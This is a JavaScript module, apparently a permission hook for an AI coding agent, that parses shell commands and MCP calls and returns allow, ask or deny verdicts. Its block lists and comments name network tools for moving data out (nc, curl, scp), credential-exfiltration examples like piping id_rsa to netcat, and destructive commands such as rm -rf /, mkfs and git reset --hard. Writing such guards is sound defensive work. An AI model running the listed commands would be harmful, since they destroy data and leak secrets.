// Command policy: shell parsing, wrapper stripping, git classification, credential exposure,
// and the allow/ask/deny decisions for shell and MCP calls.
import { existsSync, statSync } from "node:fs";
import { resolve } from "node:path";
import { posix, sensitivePath, whichCommand } from "./core.mjs";
/** True when the command cannot be spawned as one program with literal arguments. */
export function requiresShell(parse) {
    return parse.segments.length !== 1 || parse.dynamic || parse.expands || parse.segments[0].rawTokens.length === 0;
}
// Words a shell interprets itself. Some also exist as programs (`echo`, `test`, `time`), but
// the builtin's semantics are what the author of the command line meant.
const SHELL_KEYWORDS = new Set([
    ".", "source", "exec", "command", "builtin", "eval", "cd", "export", "unset", "set", "exit", "return",
    "time", "if", "then", "else", "fi", "for", "while", "until", "do", "done", "case", "esac", "function",
    "select", "alias", "trap", "ulimit", "umask", "wait", "local", "declare", "typeset", "readonly", "shift",
    "call", "setlocal", "endlocal", "echo", "type", "hash", "read", "test", "[", "[[",
]);
/**
 * How to run a command so that what runs is what was written. `direct` names a resolved
 * executable and literal arguments, so the recorded pid is the program itself. `shell` is for
 * everything a shell must interpret: several segments, substitution, expansion, a leading
 * `NAME=value`, a shell keyword, or a Windows `.cmd`/`.bat` shim. `missing` means the program
 * is a plain word or path that resolves to nothing, which a caller reports as a missing tool
 * rather than guessing that a shell would find it.
 */
export function directSpawnTarget(parse, cwd) {
    if (requiresShell(parse))
        return { kind: "shell" };
    const tokens = parse.segments[0].rawTokens;
    const program = tokens[0];
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(program) || SHELL_KEYWORDS.has(program.toLowerCase()))
        return { kind: "shell" };
    const fileAt = (candidate) => {
        try {
            return statSync(candidate).isFile() ? candidate : null;
        }
        catch {
            return null;
        }
    };
    let resolved;
    if (program.includes("/") || program.includes("\\")) {
        resolved = fileAt(resolve(cwd, program));
    }
    else {
        resolved = whichCommand(program);
        // cmd.exe also finds a plain word in the working directory (`gradlew build`); sh does not.
        // PATHEXT comes first, as in cmd.exe: `gradlew.bat` wins over the POSIX `gradlew` script.
        if (!resolved && process.platform === "win32") {
            const extensions = [...(process.env.PATHEXT || ".COM;.EXE;.BAT;.CMD").split(";").filter(Boolean), ""];
            resolved = extensions.map((extension) => fileAt(resolve(cwd, `${program}${extension}`))).find(Boolean) ?? null;
        }
    }
    if (!resolved)
        return { kind: "missing", program };
    if (/\.(cmd|bat)$/i.test(resolved))
        return { kind: "shell" };
    return { kind: "direct", program: resolved, args: tokens.slice(1) };
}
const SHELL_EXPANSION = new Set(["$", "*", "?", "[", "~", "{", "}", "<", ">", "%"]);
// Wrappers that pass their tail through to another program. Classification has to look past them,
// otherwise `sudo rm -rf /` is only ever seen as a `sudo` call.
// The value is how many non-flag arguments the wrapper consumes before the real program.
// `timeout 5 git ...` was previously parsed as running a program called `5`.
export const COMMAND_WRAPPERS = new Map([
    ["sudo", 0],
    ["doas", 0],
    ["nohup", 0],
    ["time", 0],
    ["timeout", 1],
    ["nice", 0],
    ["ionice", 0],
    ["stdbuf", 0],
    ["command", 0],
    ["builtin", 0],
    ["exec", 0],
    ["env", 0],
]);
/** Flags that take a separate value, so the value is not mistaken for the program. */
export const WRAPPER_VALUE_FLAGS = new Set(["-n", "-c", "-u", "-g", "-U", "-o", "-e", "-i", "-p", "-k", "-s"]);
// Programs that can move file contents off the machine. Pairing one with a secret path is
// exfiltration regardless of how the rest of the line is written.
export const EGRESS_COMMANDS = new Set([
    "curl",
    "wget",
    "scp",
    "sftp",
    "rsync",
    "ssh",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "ftp",
    "invoke-restmethod",
    "invoke-webrequest",
    "start-bitstransfer",
]);
export const SHELL_ESCAPABLE = new Set([
    "\\", '"', "'", " ", "\t", "\n", "$", "`", "!", "&", "|", ";",
    "<", ">", "(", ")", "*", "?", "[", "]", "{", "}", "~", "#",
]);
export function stripExecutableName(token) {
    const normalized = posix(token).replace(/^.*\//, "");
    return normalized.replace(/\.(exe|cmd|bat|ps1)$/i, "").toLowerCase();
}
// A small POSIX-ish tokenizer. It exists to answer "which program is being run with which
// arguments", which regular expressions over the raw string cannot answer reliably.
export function parseShellCommand(value) {
    const segments = [];
    let tokens = [];
    let current = "";
    let hasCurrent = false;
    let quote = null;
    let dynamic = false;
    let expands = false;
    let substitutionDepth = 0;
    let backtickOpen = false;
    let pendingPipe = false;
    const substitutions = [];
    // Records the text a shell would run for a substitution opening at `index`; the tokenizer
    // itself continues unchanged, this only remembers what to classify.
    const captureSubstitution = (index) => {
        if (value[index] === "`") {
            const close = value.indexOf("`", index + 1);
            substitutions.push(value.slice(index + 1, close === -1 ? value.length : close).trim());
            return;
        }
        let depth = 0;
        for (let cursor = index + 1; cursor < value.length; cursor += 1) {
            if (value[cursor] === "(")
                depth += 1;
            else if (value[cursor] === ")") {
                depth -= 1;
                if (depth === 0) {
                    substitutions.push(value.slice(index + 2, cursor).trim());
                    return;
                }
            }
        }
        substitutions.push(value.slice(index + 2).trim());
    };
    const pushToken = () => {
        if (hasCurrent) {
            tokens.push(current);
            current = "";
            hasCurrent = false;
        }
    };
    const pushSegment = (nextIsPiped) => {
        pushToken();
        if (tokens.length > 0) {
            segments.push({ ...toSegment(tokens), rawTokens: [...tokens], pipedFrom: pendingPipe });
            pendingPipe = nextIsPiped;
        }
        tokens = [];
    };
    for (let index = 0; index < value.length; index += 1) {
        const char = value[index];
        if (quote === "'") {
            if (char === "'")
                quote = null;
            else {
                current += char;
                hasCurrent = true;
            }
            continue;
        }
        if (char === "\\") {
            const next = value[index + 1];
            // On Windows a backslash is the path separator, so consuming it as an escape turned
            // `C:\Users\me\.ssh\id_rsa` into an unrecognizable name and let credential reads through.
            // Only characters that genuinely need escaping in a shell are treated as escaped.
            if (next !== undefined && SHELL_ESCAPABLE.has(next)) {
                current += next;
                hasCurrent = true;
                index += 1;
            }
            else {
                current += char;
                hasCurrent = true;
            }
            continue;
        }
        if (quote === '"') {
            if (char === '"')
                quote = null;
            else {
                if (char === "$" && value[index + 1] === "(")
                    captureSubstitution(index);
                // Backticks pair across quote contexts; only the opener starts a substitution.
                if (char === "`") {
                    if (!backtickOpen)
                        captureSubstitution(index);
                    backtickOpen = !backtickOpen;
                }
                if (char === "$" && (value[index + 1] === "(" || value[index + 1] === "{"))
                    dynamic = true;
                if (char === "`")
                    dynamic = true;
                // Variables expand inside double quotes ("$PORT", "%PORT%"); globs and tildes do not.
                if (char === "$" || char === "%" || char === "`")
                    expands = true;
                current += char;
                hasCurrent = true;
            }
            continue;
        }
        if (char === "'" || char === '"') {
            quote = char;
            hasCurrent = true;
            continue;
        }
        if (char === "`") {
            dynamic = true;
            expands = true;
            // Backticks come in pairs; capture on the opener only.
            if (!backtickOpen)
                captureSubstitution(index);
            backtickOpen = !backtickOpen;
            current += char;
            hasCurrent = true;
            continue;
        }
        if (char === "$" && (value[index + 1] === "(" || value[index + 1] === "{")) {
            dynamic = true;
            expands = true;
            // `$(` opens a substitution; its parentheses belong to the token until it closes.
            if (value[index + 1] === "(") {
                substitutionDepth += 1;
                captureSubstitution(index);
            }
            current += char + value[index + 1];
            hasCurrent = true;
            index += 1;
            continue;
        }
        if (substitutionDepth > 0 && (char === "(" || char === ")")) {
            substitutionDepth += char === "(" ? 1 : -1;
            current += char;
            hasCurrent = true;
            continue;
        }
        // Unquoted parentheses group commands (a subshell), so `(shutdown -h now)` is the same
        // program call as `shutdown -h now`, not a program named `(shutdown`. Grouping is shell
        // syntax, so the command also needs a shell to run as written.
        if (char === "(" || char === ")") {
            expands = true;
            pushToken();
            continue;
        }
        if (SHELL_EXPANSION.has(char))
            expands = true;
        if (char === ";" || char === "\n" || char === "&" || char === "|") {
            const doubled = (char === "&" || char === "|") && value[index + 1] === char;
            pushSegment(char === "|" && !doubled);
            if (doubled)
                index += 1;
            continue;
        }
        if (char === " " || char === "\t" || char === "\r") {
            pushToken();
            continue;
        }
        current += char;
        hasCurrent = true;
    }
    pushSegment(false);
    return { segments, dynamic, expands, substitutions };
}
export function toSegment(tokens) {
    let index = 0;
    // Leading `NAME=value` pairs are environment assignments, not the program being run.
    while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index]))
        index += 1;
    while (index < tokens.length) {
        const name = stripExecutableName(tokens[index]);
        const consumes = COMMAND_WRAPPERS.get(name);
        if (consumes === undefined) {
            return { name, args: tokens.slice(index + 1), tokens: tokens.slice(index) };
        }
        index += 1;
        // `env` accepts its own assignments and flags before the real program.
        while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index]))
            index += 1;
        while (index < tokens.length && tokens[index].startsWith("-")) {
            const flag = tokens[index];
            index += 1;
            // A flag written separately from its value would otherwise leave the value in front.
            if (WRAPPER_VALUE_FLAGS.has(flag) && index < tokens.length && !tokens[index].startsWith("-")) {
                index += 1;
            }
        }
        for (let consumed = 0; consumed < consumes && index < tokens.length; consumed += 1)
            index += 1;
    }
    return { name: "", args: [], tokens: [] };
}
// Git accepts global options before the subcommand, so `git -C . reset --hard` and
// `git reset --hard` are the same operation written two ways.
export function gitOperation(args) {
    let index = 0;
    while (index < args.length) {
        const token = args[index];
        if (token === "-C" || token === "-c" || token === "--namespace") {
            index += 2;
            continue;
        }
        if (token.startsWith("--git-dir") || token.startsWith("--work-tree") || token.startsWith("--exec-path")) {
            index += token.includes("=") ? 1 : 2;
            continue;
        }
        if (token.startsWith("-")) {
            index += 1;
            continue;
        }
        return { subcommand: token.toLowerCase(), rest: args.slice(index + 1) };
    }
    return { subcommand: "", rest: [] };
}
export function severity(permission) {
    if (permission === "deny")
        return 2;
    if (permission === "ask")
        return 1;
    return 0;
}
export function strictest(left, right) {
    return severity(right.permission) > severity(left.permission) ? right : left;
}
// Git subcommands that only read. Anything absent from this list needs approval, because
// enumerating dangerous subcommands leaves every unlisted one silently permitted.
export const GIT_READ_ONLY = new Set([
    "status", "diff", "log", "show", "blame", "shortlog", "describe", "rev-parse", "rev-list",
    "ls-files", "ls-tree", "ls-remote", "cat-file", "for-each-ref", "symbolic-ref", "name-rev",
    "grep", "config", "help", "version", "count-objects", "verify-pack", "check-ignore",
    "check-attr", "merge-base", "hash-object", "annotate", "whatchanged", "bisect", "stash",
    "worktree", "remote", "fetch", "notes", "difftool", "range-diff", "cherry", "patch-id",
]);
/** Long options may be abbreviated as long as they stay unambiguous, so match by prefix. */
export function hasLongOption(args, option) {
    return args.some((token) => {
        if (!token.startsWith("--") || token.length < 4)
            return false;
        const name = token.split("=")[0];
        return option.startsWith(name) && name.length >= 4;
    });
}
// A branch name and a pathspec look identical as text, and branch names legitimately contain
// slashes. Asking the filesystem is the only reliable discriminator available here.
export function looksLikePathspec(root, token) {
    if (token === "." || token.endsWith("/"))
        return true;
    if (root && existsSync(resolve(root, token)))
        return true;
    return /\.[A-Za-z0-9]{1,6}$/.test(token);
}
export function classifyGit(rest, raw, root) {
    const { subcommand, rest: args } = gitOperation(rest);
    const discards = "Blocked a command that discards committed or uncommitted work.";
    if (subcommand === "reset" && hasLongOption(args, "--hard")) {
        return decision("deny", discards, raw);
    }
    if (subcommand === "clean" &&
        (args.some((token) => /^-[a-z]*f/i.test(token)) || hasLongOption(args, "--force"))) {
        return decision("deny", "Blocked a destructive command that deletes untracked files.", raw);
    }
    // `switch` cannot take a pathspec at all, so only an explicit discard is destructive.
    if (subcommand === "switch") {
        return hasLongOption(args, "--discard-changes") || args.some((token) => /^-[a-zA-Z]*f/.test(token))
            ? decision("deny", discards, raw)
            : null;
    }
    if (subcommand === "checkout") {
        const operands = args.filter((token) => !token.startsWith("-"));
        if (args.includes("--") || operands.some((token) => looksLikePathspec(root, token))) {
            return decision("deny", discards, raw);
        }
        return null;
    }
    if (subcommand === "restore") {
        // `--staged` alone rewrites the index and leaves the working tree intact.
        if (hasLongOption(args, "--staged") && !hasLongOption(args, "--worktree"))
            return null;
        return decision("deny", discards, raw);
    }
    if (subcommand === "push") {
        return decision("ask", "Publishing repository changes requires approval.", raw);
    }
    if (GIT_READ_ONLY.has(subcommand))
        return null;
    if (!subcommand)
        return null;
    return decision("ask", `The git subcommand \`${subcommand}\` is not on the read-only list, so it may change repository state.`, raw);
}
// Commands that act on the machine rather than on the repository. Recognized by the resolved
// program name after wrapper stripping, so quoted prose that mentions them is never a match.
export const MACHINE_COMMANDS = new Set(["shutdown", "reboot", "halt", "poweroff", "diskpart"]);
function isMachineCommand(name) {
    return MACHINE_COMMANDS.has(name) || name.startsWith("mkfs");
}
/** Nesting beyond which a substitution is treated as opaque and asked about rather than judged. */
export const SUBSTITUTION_DEPTH_LIMIT = 8;
/**
 * What runs inside `$(...)` and backticks is a command too, and it receives the whole semantic
 * rule set — machine commands, git discards, credential exposure — not a subset. `echo $(git
 * restore .)` discards work exactly as `git restore .` does. Nesting past the limit is asked
 * about, never waved through.
 */
export function classifySubstitutions(parse, raw, root, depth = 0) {
    let verdict = { permission: "allow" };
    if (parse.substitutions.length === 0)
        return verdict;
    if (depth > SUBSTITUTION_DEPTH_LIMIT) {
        return decision("ask", "Command substitutions are nested too deeply to classify.", raw);
    }
    for (const inner of parse.substitutions) {
        if (!inner)
            continue;
        const nested = parseShellCommand(inner);
        for (const segment of nested.segments)
            verdict = strictest(verdict, classifySegment(segment, raw, root));
        verdict = strictest(verdict, classifySecretExposure(nested, raw));
        verdict = strictest(verdict, classifySubstitutions(nested, raw, root, depth + 1));
    }
    return verdict;
}
export function classifySegment(segment, raw, root) {
    const allow = { permission: "allow" };
    if (!segment.name)
        return allow;
    if (isMachineCommand(segment.name)) {
        return decision("deny", "Blocked an obviously destructive command.", raw);
    }
    if (segment.name === "git") {
        return classifyGit(segment.args, raw, root) ?? allow;
    }
    return allow;
}
// One token can carry several paths: `--env-file=.env`, `http://host/$(cat .env)`, `a;b`.
// Splitting on shell punctuation before matching keeps substitution from hiding the target.
export function pathFragments(token) {
    const fragments = token
        .split(/[\s()`;,|<>&"']+|\$\{|\$\(/)
        .map((fragment) => fragment.trim())
        .filter(Boolean);
    const expanded = new Set();
    for (const fragment of fragments) {
        expanded.add(fragment);
        // A path fused to its option or to an `@` prefix hides the basename: `-d@.env`,
        // `-T.env`, `file=@.env`, `--env-file=.env`.
        const stripped = fragment
            .replace(/^-{1,2}[A-Za-z0-9-]*=?/, "")
            .replace(/^[A-Za-z0-9_-]+=/, "")
            .replace(/^@/, "");
        if (stripped && stripped !== fragment)
            expanded.add(stripped);
        const afterAt = fragment.replace(/^.*@/, "");
        if (afterAt && afterAt !== fragment)
            expanded.add(afterAt);
    }
    return [...expanded];
}
// Sensitive paths are gated wherever they appear, because the tool-level read guard is
// bypassed the moment the same file is opened by a shell command instead.
export function sensitiveTokens(segment) {
    const found = [];
    for (const token of segment.args) {
        if (!token)
            continue;
        for (const fragment of pathFragments(token)) {
            if (sensitivePath(fragment))
                found.push(fragment);
        }
    }
    return found;
}
export function classifySecretExposure(parse, raw) {
    let result = { permission: "allow" };
    // A pipeline moves the data across segment boundaries, so `cat id_rsa | nc host port` is
    // exfiltration even though neither segment names both the secret and the destination.
    let secretInPipeline = null;
    for (const segment of parse.segments) {
        if (!segment.pipedFrom)
            secretInPipeline = null;
        const carried = sensitiveTokens(segment);
        if (secretInPipeline && EGRESS_COMMANDS.has(segment.name)) {
            return decision("deny", `Blocked piping a likely credential file to an external destination: ${secretInPipeline}.`, raw);
        }
        if (carried.length > 0)
            secretInPipeline = carried[0];
    }
    for (const segment of parse.segments) {
        if (parse.dynamic && EGRESS_COMMANDS.has(segment.name)) {
            result = strictest(result, decision("ask", "This command sends data outward and uses substitution, so its payload cannot be verified.", raw));
        }
        const exposed = sensitiveTokens(segment);
        if (exposed.length === 0)
            continue;
        const target = exposed[0];
        if (EGRESS_COMMANDS.has(segment.name)) {
            return decision("deny", `Blocked sending a likely credential file to an external destination: ${target}.`, raw);
        }
        result = strictest(result, decision("ask", `This command reads or writes a likely credential or secret file: ${target}.`, raw));
    }
    return result;
}
export function shellDecision(command, root) {
    const value = String(command || "").trim();
    const lower = value.toLowerCase();
    const allow = { permission: "allow" };
    if (!value)
        return allow;
    // Semantic classification runs first and is never relaxed by the legacy pattern lists below;
    // the two layers are combined by taking the strictest verdict.
    const parse = parseShellCommand(value);
    let semantic = allow;
    for (const segment of parse.segments) {
        semantic = strictest(semantic, classifySegment(segment, value, root));
    }
    // What runs inside `$(...)` and backticks is a command too, judged by the same rules.
    semantic = strictest(semantic, classifySubstitutions(parse, value, root));
    semantic = strictest(semantic, classifySecretExposure(parse, value));
    if (semantic.permission === "deny")
        return semantic;
    const denyPatterns = [
        /\bgit\s+(reset\s+--hard|clean\s+(?:--force|-[a-z]*f[a-z]*)|checkout\s+--)\b/i,
        // Machine-level commands are recognized in command position only, so a commit message or
        // an echo that merely mentions "shutdown" is not read as a shutdown.
        // Separators, wrappers, and substitutions are judged by the semantic layer above, which
        // knows quote context; this net is anchored to the start of the line, where no quote can
        // precede it, so prose inside a quoted argument is never a match here either.
        /^\s*(?:(?:sudo|doas)(?:\s+-{1,2}[\w-]+(?:[= ]\S+)?)*\s+)?(mkfs(\.\w+)?|diskpart|shutdown|reboot|halt|poweroff)\b/i,
        /\bformat\s+[a-z]:/i,
        /\bdd\b[^;&|]*(\bof=\/dev\/|\bof=\\\\\.\\physicaldrive)/i,
        /\b(drop|truncate)\s+(database|schema)\b/i,
        // Root, root wildcard, parent traversal, or the .git directory. Anchored to argument
        // boundaries so `rm -rf build/`, `rm dir/*.log`, and `rm .gitignore` are recursive or plain
        // deletions that ask, not "obviously destructive" ones that deny.
        /\b(rm|rmdir)\b[^;&|]*(--no-preserve-root|(?:^|\s)["']?\/["']?(?=[\s;&|)]|$)|(?:^|\s)["']?\/\*|(?:^|\s|[\\/])\.\.(?:[\\/]|\s|$)|(?:^|\s|[\\/])\.git(?:[\\/]|\s|$))/i,
        /\b(remove-item|del|erase)\b[^;&|]*(\*|\.\.[\\/]|\.git)[^;&|]*(-recurse|-force|\/s|\/q)/i,
        /\bremove-item\b[^;&|]*\b[a-z]:[\\/]["']?\s+[^;&|]*(-recurse|-force)/i,
        /\b(reg\s+delete|bcdedit)\b/i,
    ];
    if (denyPatterns.some((pattern) => pattern.test(value))) {
        return decision("deny", "Blocked an obviously destructive command.", value);
    }
    if (parse.dynamic && parse.segments.every((segment) => !segment.name)) {
        return strictest(semantic, decision("ask", "This command is built entirely by substitution.", value));
    }
    const askPatterns = [
        /\bgit(?:\s+(?:-[a-zA-Z]\s+\S+|--[\w-]+(?:=\S+)?))*\s+push\b/i,
        /\b(gh\s+(pr\s+merge|release\s+create)|npm\s+publish|cargo\s+publish|twine\s+upload)\b/i,
        /\bgh\s+(api|issue\s+create|pr\s+create)\b/i,
        /\bcurl\b[^;&|]*(?:\s-d(?:\s|=)|--data(?:-[a-z]+)?(?:\s|=)|--upload-file(?:\s|=)|\s-T\s)/i,
        /\b(invoke-restmethod|invoke-webrequest)\b[^;&|]*(?:-method\s+(post|put|patch|delete)|-body\b)/i,
        /\b(kubectl|helm|terraform|pulumi|ansible-playbook)\b/i,
        /\b(production|prod)\b.*\b(deploy|apply|migrate|restart|delete)\b/i,
        /\b(deploy|release|publish)\b.*\b(production|prod)\b/i,
        /\b(?:npm|pnpm|yarn)(?:\s+(?:--prefix|--cwd|-C)\s+\S+|\s+--[\w-]+(?:=\S+)?)*\s+(?:install|add|i)\b/i,
        /\b(?:pip|pip3|uv|cargo|go)\s+(?:install|add|get)\b/i,
        /\b(sudo|runas|start-process\b.*-verb\s+runas)\b/i,
        /\b(kill|killall|pkill|taskkill|stop-process)\b/i,
        /\b(?:rm|rmdir|del|erase|remove-item)\b/i,
        /\b(rm|rmdir)\b[^;&|]*-[a-z]*r/i,
        /\bremove-item\b[^;&|]*-recurse/i,
        /\bdocker\s+(system|volume|image|container)\s+prune\b/i,
        /\b(?:sh|bash|zsh)\s+-c\b/i,
        /\b(?:powershell|pwsh)(?:\.exe)?\s+(?:-command|-c)\b/i,
        /\bnode(?:\.exe)?\s+(?:-e|--eval)\b/i,
        /\b(?:python|python3|py)(?:\.exe)?\s+-c\b/i,
    ];
    if (askPatterns.some((pattern) => pattern.test(value))) {
        return strictest(semantic, decision("ask", "This command has external, destructive, privileged, or installation side effects.", value));
    }
    return lower.includes("git push")
        ? strictest(semantic, decision("ask", "Publishing repository changes requires approval.", value))
        : semantic;
}
export function mcpDecision(payload) {
    const name = String(payload.tool_name || "").toLowerCase();
    const input = typeof payload.tool_input === "string"
        ? payload.tool_input.toLowerCase()
        : JSON.stringify(payload.tool_input || {}).toLowerCase();
    const combined = `${name} ${input}`;
    // An MCP tool reaching a credential path is the same exposure as a shell command doing it,
    // so the check lives here too rather than only on the file-read hook.
    for (const fragment of pathFragments(input)) {
        if (sensitivePath(fragment)) {
            return decision("deny", `Blocked an MCP call that references a likely credential file: ${fragment}.`, name);
        }
    }
    // `deny` has no approval path, so it is reserved for the tool name itself declaring a
    // destructive operation. A production hint that only appears in the arguments becomes `ask`,
    // because a read-only query whose text happens to contain "prod" and "update" is not a threat.
    if (/(^|[_-])(delete|destroy|drop|purge|revoke|rotate[_-]secret)([_-]|$)/.test(name)) {
        return decision("deny", "Blocked a destructive MCP operation.", name);
    }
    // Matching a structured field rather than the whole payload: a read-only search whose query
    // text happens to contain "production" and "update" is not a production mutation, and `deny`
    // has no approval path for the caller to recover through.
    const declaredEnvironment = /"(?:environment|env|stage|target)"\s*:\s*"[^"]*\b(?:prod|production)\b[^"]*"/.test(input);
    const declaredMutation = /"(?:operation|action|method|mode|verb)"\s*:\s*"(?:write|create|update|edit|upsert|patch|put|post|delete|drop|deploy|apply|migrate)"/.test(input);
    if (declaredEnvironment && declaredMutation) {
        return decision("deny", "Blocked a declared mutation against a production environment.", name);
    }
    if (declaredEnvironment || (/\b(prod|production)\b/.test(combined) && declaredMutation)) {
        return decision("ask", "This MCP call may reach a production system.", name);
    }
    if (/(^|[_-])(write|create|update|edit|send|post|put|patch|merge|publish|deploy|apply|upload|invite|comment|message|issue|pull-request|release)([_-]|$)/.test(name.replaceAll("pull_request", "pull-request")) ||
        /"(operation|action|method)"\s*:\s*"(write|create|update|edit|send|post|put|patch|merge|publish|deploy|apply|upload|delete)"/.test(input)) {
        return decision("ask", "This MCP tool appears to write data or cause an external side effect.", name);
    }
    return { permission: "allow" };
}
export function decision(permission, message, subject) {
    return {
        permission,
        user_message: message,
        agent_message: `${message} Review and obtain explicit user approval before retrying: ${subject}`,
    };
}
/** Tools known to only read. Everything else is treated as capable of writing. */
export const READ_ONLY_TOOLS = new Set([
    "read",
    "readfile",
    "glob",
    "grep",
    "list",
    "listdir",
    "ls",
    "search",
    "codebase_search",
    "websearch",
    "webfetch",
]);
export const TOOL_PATH_KEYS = [
    "file_path",
    "path",
    "target_file",
    "notebook_path",
    "filename",
    "file",
    "destination",
    "source",
];
/** Collects every path a tool input names, including list-valued and nested edit payloads. */
export function toolPaths(input) {
    const found = [];
    const consider = (value) => {
        if (typeof value === "string" && value.trim())
            found.push(value);
        else if (Array.isArray(value))
            for (const entry of value)
                consider(entry);
    };
    for (const key of TOOL_PATH_KEYS)
        consider(input[key]);
    for (const key of ["paths", "file_paths", "files", "targets"])
        consider(input[key]);
    for (const key of ["edits", "operations", "changes"]) {
        const nested = input[key];
        if (!Array.isArray(nested))
            continue;
        for (const entry of nested) {
            if (entry && typeof entry === "object") {
                for (const key2 of TOOL_PATH_KEYS)
                    consider(entry[key2]);
            }
        }
    }
    return [...new Set(found)];
}
